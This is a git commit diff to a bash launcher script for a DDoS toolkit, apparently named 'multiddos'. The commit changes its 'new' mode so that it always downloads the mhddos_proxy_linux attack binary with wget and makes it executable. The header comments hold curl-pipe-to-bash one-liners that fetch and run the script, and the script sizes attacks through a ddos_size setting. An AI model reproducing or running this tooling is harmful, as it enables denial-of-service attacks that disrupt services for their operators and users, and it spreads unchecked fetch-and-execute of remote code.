80a3e5d9466eecd7caf601fc8afa175047ce2735
uaripper <uaripper@mail.local>
2022-07-20 20:35:17 +0300

    adding new mode

--- md2.sh
+++ md2.sh
@@ -1,7 +1,7 @@
 #!/bin/bash
 # curl -LO tiny.one/multiddos && bash multiddos
 # curl -O https://raw.githubusercontent.com/KarboDuck/multiddos/main/md2.sh && bash md2.sh
-clear && echo -e "Loading... v1.2g\n"
+clear && echo -e "Loading... v1.2h\n"
 sudo apt-get update -q -y #>/dev/null 2>&1
 sudo apt-get install -q -y tmux jq git toilet python3 python3-pip 
 pip install --upgrade pip >/dev/null 2>&1
@@ -131,11 +131,7 @@ pkill -f mhddos_proxy_linux
 
 if [[ $mhddos_mode == "new" ]]; then
     cd ~/multidd/
-
-    if [ ! -f "~/multidd/mhddos_proxy_linux" ]; then
-    wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux
-    fi
-    
+    wget https://github.com/porthole-ascend-cinnamon/mhddos_proxy_releases/releases/latest/download/mhddos_proxy_linux 
     chmod +x mhddos_proxy_linux
 
     if [[ $ddos_size == "XS" ]]; then
